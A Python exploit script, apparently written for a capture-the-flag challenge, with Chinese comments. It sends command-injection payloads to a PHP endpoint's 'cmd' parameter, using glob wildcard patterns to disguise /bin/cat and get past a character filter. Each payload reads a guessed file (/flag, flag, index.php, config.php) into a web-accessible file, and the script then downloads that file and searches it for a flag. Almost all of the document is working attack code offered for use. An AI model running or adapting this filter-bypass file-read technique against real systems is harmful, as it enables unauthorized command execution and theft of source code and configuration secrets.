import requests
import re

# ================= 配置 =================
BASE_URL = "http://172.17.0.15:14973"  # 你的题目IP
SCRIPT_URL = BASE_URL + "/index.php"
OUTPUT_FILE = "0"


# 字符数生成器
def get_pattern(length):
    return "[!,]" * length


# 核心攻击函数
def attack(filename_pattern, filename_desc):
    print(f"\n[*] 正在尝试读取文件: {filename_desc}")

    # 1. 构造 Payload
    # 使用 3 字符命令 (/[!,][!,][!,]) 对应 /bin/cat 或 /bin/awk
    # 使用 3 字符是因为你之前用它成功打出过 ELF，比 2 字符的 cp 更稳健
    path_bin = "/[!,][!,][!,]"
    cmd_bin = "/[!,][!,][!,]"

    # 组合: /bin/cat {filename} > 0
    payload = f"{path_bin}{cmd_bin} {filename_pattern} > {OUTPUT_FILE}"

    try:
        # 发送攻击
        requests.post(SCRIPT_URL, data={'cmd': payload}, timeout=3)
    except:
        pass  # 忽略 timeout

    # 2. 下载并检查
    try:
        res = requests.get(f"{BASE_URL}/{OUTPUT_FILE}")
        if res.status_code == 200:
            content = res.content
            size = len(content)

            if size == 0:
                print(f"[-] 文件为空。说明 {filename_desc} 不存在。")
            else:
                print(f"[!] 发现内容！大小: {size} 字节")
                # 尝试解码
                text = content.decode('utf-8', errors='ignore')

                # 1. 搜索 flag 格式
                flags = re.findall(r'flag\{.*?\}', text)
                if flags:
                    print(f"\n[SUCCESS] 找到 Flag: {flags[0]}\n")
                    return True

                # 2. 如果没 flag 格式，打印最后一部分 (防止是纯文本 flag)
                print(f"[*] 文件末尾内容: {text[-200:]}")
                return True
    except Exception as e:
        print(f"ERR: {e}")

    return False


# ================= 主程序 =================
print("--- 开始文件名扫描 ---")

# 1. 尝试根目录的 /flag (CTF 最常见)
# 格式: /flag (5字符)
if attack("/[!,][!,][!,][!,]", "/flag (根目录)"):
    exit()

# 2. 尝试当前目录的 flag (无后缀)
# 格式: flag (4字符)
if attack(get_pattern(4), "flag (当前目录, 无后缀)"):
    exit()

# 3. 尝试读取 index.php (验证环境)
# 格式: index.php (9字符)
# 如果这个成功了但没flag，说明环境通了，只是flag藏得深
attack(get_pattern(9), "index.php (环境验证)")

# 4. 尝试 config.php (10字符)
attack(get_pattern(10), "config.php")